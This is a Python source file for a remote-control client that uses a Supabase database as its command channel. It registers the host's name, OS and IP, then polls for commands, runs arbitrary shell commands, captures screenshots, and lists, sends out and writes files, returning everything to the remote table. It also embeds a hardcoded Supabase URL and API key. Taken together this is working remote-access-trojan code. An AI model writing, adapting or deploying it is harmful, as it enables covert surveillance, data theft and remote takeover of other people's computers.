import os
import time
import base64
import tempfile
import pyautogui
import subprocess
import platform
import socket
from datetime import datetime
import hashlib
import json  # For handling file transfers via JSON messages
from supabase import create_client, Client

CLIENT_ID_FILE = "client_id.txt"

class RemoteClient:
    def __init__(self):
        # Initialize Supabase client
        self.supabase: Client = create_client(
            "https://nufgpguitvkxctpagwwf.supabase.co",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im51ZmdwZ3VpdHZreGN0cGFnd3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzY5NTA0MTIsImV4cCI6MjA1MjUyNjQxMn0.-MLSuSnfllGJrrQMEfHrQjxZoeujy6jZiHG9L9jY6Ik"
        )
        self.client_id = self.get_or_create_client_id()
        self.register_client()
        
    def get_or_create_client_id(self):
        """Retrieve the persisted client ID or create a new one."""
        if os.path.exists(CLIENT_ID_FILE):
            with open(CLIENT_ID_FILE, "r") as f:
                client_id = f.read().strip()
            print(f"Using persisted client ID: {client_id}")
            return client_id
        else:
            # Generate unique client ID (using hostname and time)
            hostname = socket.gethostname()
            client_id = hashlib.sha256(f"{hostname}{time.time()}".encode()).hexdigest()[:12]
            with open(CLIENT_ID_FILE, "w") as f:
                f.write(client_id)
            print(f"Generated and saved new client ID: {client_id}")
            return client_id
        
    def register_client(self):
        """Register client with Supabase or update its record."""
        hostname = socket.gethostname()
        os_info = platform.platform()
        try:
            # Try to update the client record if it already exists
            result = self.supabase.table('clients')\
                .update({
                    "hostname": hostname,
                    "os": os_info,
                    "last_seen": datetime.utcnow().isoformat()
                })\
                .eq('client_id', self.client_id)\
                .execute()
            # If no record exists, insert a new one
            if not result.data:
                data = {
                    "client_id": self.client_id,
                    "hostname": hostname,
                    "os": os_info,
                    "ip_address": socket.gethostbyname(hostname),
                    "last_seen": datetime.utcnow().isoformat()
                }
                result = self.supabase.table('clients').insert(data).execute()
                if not result.data:
                    raise Exception("Failed to register client")
            print(f"Registered/Updated client with ID: {self.client_id}")
        except Exception as e:
            print(f"Registration error: {e}")
            raise

    def execute_command(self, command: str) -> str:
        """Execute system command and return result."""
        try:
            result = subprocess.run(
                command, 
                shell=True, 
                text=True, 
                capture_output=True, 
                timeout=30
            )
            return result.stdout.strip() or result.stderr.strip() or "Command executed successfully."
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"

    def capture_screenshot(self) -> str:
        """Capture screenshot and return base64 encoded string."""
        try:
            # Create a temporary file and immediately close the file descriptor.
            fd, screenshot_path = tempfile.mkstemp(suffix=".png")
            os.close(fd)  # Prevent file locking issues on Windows
            
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            
            with open(screenshot_path, 'rb') as image_file:
                base64_image = base64.b64encode(image_file.read()).decode()
            
            os.unlink(screenshot_path)
            return base64_image
        except Exception as e:
            print(f"Screenshot error: {e}")
            return None

    def send_message(self, message_type: str, content: str):
        """Send message to Supabase."""
        try:
            data = {
                "client_id": self.client_id,
                "type": message_type,
                "content": content,
                "status": "delivered"
            }
            self.supabase.table('messages').insert(data).execute()
            return True
        except Exception as e:
            print(f"Error sending message: {e}")
            return False

    def handle_file_manager(self, command: str):
        """Handle file manager related commands."""
        parts = command.split(" ", 2)
        action = parts[1] if len(parts) > 1 else None

        if action == "list":
            # Command format: "file list <directory>"
            directory = parts[2] if len(parts) > 2 else "."
            try:
                files = os.listdir(directory)
                response = "\n".join(files)
            except Exception as e:
                response = f"Error listing directory: {e}"
            self.send_message("text", response)

        elif action == "get":
            # Command format: "file get <filepath>"
            filepath = parts[2] if len(parts) > 2 else None
            if filepath and os.path.exists(filepath):
                try:
                    with open(filepath, "rb") as f:
                        file_bytes = f.read()
                    b64_content = base64.b64encode(file_bytes).decode()
                    # Wrap file info in JSON for clarity:
                    response = json.dumps({
                        "filename": os.path.basename(filepath),
                        "content": b64_content
                    })
                except Exception as e:
                    response = f"Error reading file: {e}"
            else:
                response = "File does not exist."
            self.send_message("file", response)

        elif action == "upload":
            # Command format: "file upload <destination>" with the file content sent in another message.
            # For simplicity, assume the file content is provided in the same command as JSON.
            try:
                payload = json.loads(parts[2])
                destination = payload.get("destination")
                file_content = payload.get("content")  # base64 encoded
                if destination and file_content:
                    with open(destination, "wb") as f:
                        f.write(base64.b64decode(file_content))
                    response = f"File saved to {destination}"
                else:
                    response = "Invalid upload parameters."
            except Exception as e:
                response = f"Error processing upload: {e}"
            self.send_message("text", response)

        else:
            self.send_message("text", "Unknown file command.")

    def process_command(self, command: str):
        """Process received command."""
        try:
            if command.startswith("cmd "):
                result = self.execute_command(command[4:])
                self.send_message("text", result)
            elif command == "get image":
                base64_image = self.capture_screenshot()
                if base64_image:
                    self.send_message("image", base64_image)
                    print("Screenshot sent successfully")
            elif command.startswith("file "):
                # Handle file manager commands
                self.handle_file_manager(command)
            else:
                self.send_message("text", "Unknown command.")
        except Exception as e:
            print(f"Command processing error: {e}")
            self.send_message("text", f"Error processing command: {str(e)}")

    def run(self):
        """Main client loop."""
        print(f"Client running with ID: {self.client_id}")
        last_id = 0
        while True:
            try:
                # Poll for new messages from Supabase
                messages = self.supabase.table('messages')\
                    .select('*')\
                    .eq('client_id', self.client_id)\
                    .eq('status', 'pending')\
                    .order('created_at')\
                    .execute()
                for message in messages.data:
                    if message['type'] == 'command' and message['id'] > last_id:
                        print(f"Processing command: {message['content']}")
                        self.process_command(message['content'])
                        # Update message status
                        self.supabase.table('messages')\
                            .update({"status": "processed"})\
                            .eq('id', message['id'])\
                            .execute()
                        last_id = message['id']
                # Update last_seen so the dashboard knows the client is online.
                self.supabase.table('clients')\
                    .update({"last_seen": datetime.utcnow().isoformat()})\
                    .eq('client_id', self.client_id)\
                    .execute()
                time.sleep(1)
            except Exception as e:
                print(f"Main loop error: {e}")
                time.sleep(5)

if __name__ == "__main__":
    client = RemoteClient()
    client.run()
